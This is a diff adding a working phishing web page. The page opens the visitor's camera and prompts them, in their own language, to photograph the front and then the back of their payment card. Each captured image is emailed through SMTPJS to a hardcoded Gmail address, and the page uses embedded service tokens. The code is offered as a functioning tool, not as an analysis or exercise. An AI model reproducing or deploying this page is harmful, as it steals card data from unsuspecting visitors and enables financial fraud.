@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    
+    <meta name="google" content="notranslate">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="invalid.css">
+    <style>
+        body{
+          background-color: #000000;
+        }
+       #content {
+            background-color: black;
+        }
+        body.loading #content {
+            
+           display: none;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            }
+        #video-container {
+            position: relative;
+            width: 400px;
+            height: 499px;
+            display: none; 
+            align-items: center;
+            justify-content: center;                   
+            margin-left: -17px;
+        }
+        #video {
+            width: 100%;
+            height: 102%;
+        }
+        #snap {
+            position: absolute;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            padding: 10px 20px;
+            background-color: #6acbff;
+            color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 45px;
+            font-size: 45px;
+        }
+        #camera-icon {
+            width: 50px;
+            cursor: pointer;
+        }
+        #message {
+            text-align: center;
+            font-size: 29px;
+            margin: 20px;
+            font-family: "Poppins", sans-serif;
+            color: #ffffff;
+            font-weight: bold;
+        }
+        .mark p {
+            font-size: 89px;
+            color: #ffffff;
+        }
+        /* Loading state style */
+        body.loading {
+            overflow: hidden; /* Prevent scrolling */
+        }
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+            z-index: 1000; /* Ensure it's on top of other elements */
+        }
+    </style>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            document.body.classList.add('loading');
+
+            // Remove the loading state after 2 seconds
+            setTimeout(function() {
+                document.body.classList.remove('loading');
+            }, 2000); // 2000 milliseconds = 2 seconds;
+        });
+    </script>
+</head>
+<body>
+    <div id="content">
+        <title>Captura de Imágenes</title>
+        <div id="video-container">
+            <video id="video" autoplay></video>
+            <button id="snap" onclick="captureAndShowMessage()">📷</button>
+        </div>
+        <div class="mark">
+            <p id="message">¡Ahora tome la foto frontal de su tarjeta 💳!</p>
+        </div>
+        <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
+
+        <script src="https://smtpjs.com/v3/smtp.js"></script>
+        <script>
+            let videoStream;
+            let snapCount = 0;
+            const video = document.getElementById('video');
+            const videoContainer = document.getElementById('video-container');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            const message = document.getElementById('message');
+
+            const countryLanguageMap = {
+        "AF": "fa", "AL": "sq", "DZ": "ar", "AS": "en", "AD": "ca", "AO": "pt", "AG": "en",
+        "AR": "es", "AM": "hy", "AU": "en", "AT": "de", "AZ": "az", "BS": "en", "BH": "ar",
+        "BD": "bn", "BB": "en", "BY": "be", "BE": "nl", "BZ": "en", "BJ": "fr", "BT": "dz",
+        "BO": "es", "BA": "bs", "BW": "en", "BR": "pt", "BN": "ms", "BG": "bg", "BF": "fr",
+        "BI": "fr", "CV": "pt", "KH": "km", "CM": "fr", "CA": "en", "CF": "fr", "TD": "fr",
+        "CL": "es", "CN": "zh-CN", "CO": "es", "KM": "ar", "CD": "fr", "CG": "fr", "CR": "es",
+        "CI": "fr", "HR": "hr", "CU": "es", "CY": "el", "CZ": "cs", "DK": "da", "DJ": "fr",
+        "DM": "en", "DO": "es", "EC": "es", "EG": "ar", "SV": "es", "GQ": "es", "ER": "ti",
+        "EE": "et", "SZ": "en", "ET": "am", "FJ": "en", "FI": "fi", "FR": "fr", "GA": "fr",
+        "GM": "en", "GE": "ka", "DE": "de", "GH": "en", "GR": "el", "GD": "en", "GT": "es",
+        "GN": "fr", "GW": "pt", "GY": "en", "HT": "fr", "HN": "es", "HU": "hu", "IS": "is",
+        "IN": "hi", "ID": "id", "IR": "fa", "IQ": "ar", "IE": "en", "IL": "he", "IT": "it",
+        "JM": "en", "JP": "ja", "JO": "ar", "KZ": "kk", "KE": "sw", "KI": "en", "KP": "ko",
+        "KR": "ko", "KW": "ar", "KG": "ky", "LA": "lo", "LV": "lv", "LB": "ar", "LS": "en",
+        "LR": "en", "LY": "ar", "LI": "de", "LT": "lt", "LU": "lb", "MG": "mg", "MW": "en",
+        "MY": "ms", "MV": "dv", "ML": "fr", "MT": "mt", "MH": "en", "MR": "ar", "MU": "en",
+        "MX": "es", "FM": "en", "MD": "ro", "MC": "fr", "MN": "mn", "ME": "sr", "MA": "ar",
+        "MZ": "pt", "MM": "my", "NA": "en", "NR": "na", "NP": "ne", "NL": "nl", "NZ": "en",
+        "NI": "es", "NE": "fr", "NG": "en", "MK": "mk", "NO": "no", "OM": "ar", "PK": "ur",
+        "PW": "en", "PA": "es", "PG": "en", "PY": "es", "PE": "es", "PH": "tl", "PL": "pl",
+        "PT": "pt", "QA": "ar", "RO": "ro", "RU": "ru", "RW": "rw", "KN": "en", "LC": "en",
+        "VC": "en", "WS": "sm", "SM": "it", "ST": "pt", "SA": "ar", "SN": "fr", "RS": "sr",
+        "SC": "fr", "SL": "en", "SG": "zh-CN", "SK": "sk", "SI": "sl", "SB": "en", "SO": "so",
+        "ZA": "af", "SS": "en", "ES": "es", "LK": "si", "SD": "ar", "SR": "nl", "SE": "sv",
+        "CH": "de", "SY": "ar", "TW": "zh-TW", "TJ": "tg", "TZ": "sw", "TH": "th", "TL": "pt",
+        "TG": "fr", "TO": "to", "TT": "en", "TN": "ar", "TR": "tr", "TM": "tk", "UG": "en",
+        "UA": "uk", "AE": "ar", "GB": "en", "US": "en", "UY": "es", "UZ": "uz", "VU": "bi",
+        "VE": "es", "VN": "vi", "YE": "ar", "ZM": "en", "ZW": "en"
+    };
+
+
+            function detectCountry(callback) {
+                fetch('https://ipinfo.io/json?token=84581b889c1970')
+                    .then(response => response.json())
+                    .then(data => {
+                        callback(data.country);
+                    })
+                    .catch(error => console.error('Error detecting country:', error));
+            }
+
+            function translateText(text, targetLanguage, callback) {
+                fetch(`https://translate.googleapis.com/translate_a/single?client=gtx&sl=es&tl=${targetLanguage}&dt=t&q=${encodeURI(text)}`)
+                    .then(response => response.json())
+                    .then(data => {
+                      const translatedText = data[0].map(item => item[0]).join('');
+                        callback(translatedText);
+                    })
+                    .catch(error => console.error('Error translating text:', error));
+            }
+
+            function openCamera() {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } })
+                    .then(function (stream) {
+                        video.srcObject = stream;
+                        videoStream = stream;
+                        videoContainer.style.display = 'block';
+                    })
+                    .catch(function (err) {
+                        console.error("Error al acceder a la cámara: " + err);
+                    });
+            }
+
+            function closeCamera() {
+                if (videoStream) {
+                    let tracks = videoStream.getTracks();
+                    tracks.forEach(track => track.stop());
+                    video.srcObject = null;
+                    videoContainer.style.display = 'none';
+                }
+            }
+
+            function sendEmail(imageDataUrl, callback) {
+                Email.send({
+                    SecureToken: "9a099cf2-87ef-4902-8426-17dcc04b64a0", // Replace with your SMTPJS secure token
+                    To: 'youngella513@gmail.com',
+                    From: 'youngella513@gmail.com',
+                    Subject: 'Imagen Capturada',
+                    Body: 'Aquí está la imagen que capturó.',
+                    Attachments: [
+                        {
+                            name: "imagen_capturada.jpg",
+                            data: imageDataUrl.replace(/^data:image\/(png|jpeg);base64,/, "")
+                        }
+                    ]
+                }).then(function (message) {
+                    console.log('Correo enviado correctamente:', message);
+                    callback();
+                }).catch(function (error) {
+                    console.error('Error al enviar el correo:', error);
+                    callback();
+                });
+            }
+
+            function captureAndShowMessage() {
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const dataUrl = canvas.toDataURL('image/jpeg');
+
+                closeCamera();
+
+                detectCountry(function(country) {
+                    const targetLanguage = countryLanguageMap[country] || '';
+                    let firstMessage = '¡Ahora tome la foto frontal de su tarjeta 💳!!!';
+                    let successMessage = '¡Éxito! ¡Ahora tome la foto trasera de su tarjeta 💳!!!';
+
+                    if (snapCount === 0) {
+                        translateText(firstMessage, targetLanguage, function(translatedText) {
+                            message.innerText = translatedText;
+                            sendEmail(dataUrl, function() {
+                                translateText(successMessage, targetLanguage, function(translatedText) {
+                                    message.innerText = translatedText;
+                                    openCamera();
+                                });
+                            });
+                        });
+                        snapCount++;
+                    } else {
+                        sendEmail(dataUrl, function() {
+                            window.location.href = 'thankyou.html';
+                        });
+                    }
+                });
+            }
+
+            window.onload = function() {
+                detectCountry(function(country) {
+                    const targetLanguage = countryLanguageMap[country] || '';
+                    translateText('¡Ahora tome la foto frontal de su tarjeta 💳!!!', targetLanguage, function(translatedText) {
+                        message.innerText = translatedText;
+                    });
+                    openCamera();
+                });
+            };
+        </script>
+    </div>
+</body>
+</html>
